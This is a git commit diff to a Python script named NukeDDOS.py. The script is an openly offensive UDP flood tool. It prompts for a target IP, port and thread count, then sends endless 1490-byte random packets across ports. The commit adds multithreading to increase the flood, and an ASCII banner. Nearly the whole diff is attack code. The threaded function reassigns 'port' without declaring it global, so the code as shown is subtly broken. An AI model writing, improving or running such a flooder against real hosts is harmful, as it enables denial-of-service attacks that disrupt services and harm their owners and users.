db4009317ccab9d98b8553b3ae79bb9d4e1a7fc9
Laila19 <laila.cypher19@proton.me>
2025-05-12 20:11:39 -0300

    Update NukeDDOS.py

--- NukeDDOS.py
+++ NukeDDOS.py
@@ -3,9 +3,9 @@ import os
 import time
 import socket
 import random
+import threading
 from datetime import datetime
 
-# Get current time
 now = datetime.now()
 hour = now.hour
 minute = now.minute
@@ -13,23 +13,46 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
 
-# Clear screen and print banner
 os.system("clear")
 os.system("figlet DDos Attack")
+print("""
+-------------------------------------------------------------------------------------------------
+|                                                                                                 |
+|                                                                                                 |
+|      ________   ___  ___  ___  __    _______   ________  ________  ________  ________           |
+|     |\   ___  \|\  \|\  \|\  \|\  \ |\  ___ \ |\   ___ \|\   ___ \|\   __  \|\   ____\          |
+|     \ \  \\ \  \ \  \\\  \ \  \/  /|\ \   __/|\ \  \_|\ \ \  \_|\ \ \  \|\  \ \  \___|_         |
+|      \ \  \\ \  \ \  \\\  \ \   ___  \ \  \_|/_\ \  \ \\ \ \  \ \\ \ \  \\\  \ \_____  \        |
+|       \ \  \\ \  \ \  \\\  \ \  \\ \  \ \  \_|\ \ \  \_\\ \ \  \_\\ \ \  \\\  \|____|\  \       |
+|        \ \__\\ \__\ \_______\ \__\\ \__\ \_______\ \_______\ \_______\ \_______\____\_\  \      |
+|         \|__| \|__|\|_______|\|__| \|__|\|_______|\|_______|\|_______|\|_______|\_________\     |
+|                                                                                \|_________|     |
+|                                                                                                 |
+|                                                                                                 |
+-------------------------------------------------------------------------------------------------
+""")
 print("Author   : Laila19")
 print("GitHub   : https://github.com/lailacypher")
 print()
 
-# User input for target IP and port
 ip = input("Target IP: ")
 port = int(input("Port: "))
+threads = int(input("Number of Threads: "))
 
-# Clear screen and show attack starting progress
+def attack():
+    sent = 0
+    while True:
+        sock.sendto(bytes, (ip, port))
+        sent += 1
+        port = port + 1
+        print(f"Sent {sent} packet(s) to {ip} through port: {port}")
+        
+        if port == 65534:
+            port = 1
+
 os.system("clear")
 os.system("figlet Attack Starting")
 print("[                    ] 0% ")
@@ -43,14 +66,6 @@ time.sleep(1)
 print("[====================] 100%")
 time.sleep(2)
 
-# Send packets in an infinite loop
-sent = 0
-while True:
-    sock.sendto(bytes, (ip, port))
-    sent += 1
-    port = port + 1
-    print(f"Sent {sent} packet(s) to {ip} through port: {port}")
-    
-    # Reset port after reaching 65534
-    if port == 65534:
-        port = 1
+for _ in range(threads):
+    t = threading.Thread(target=attack)
+    t.start()
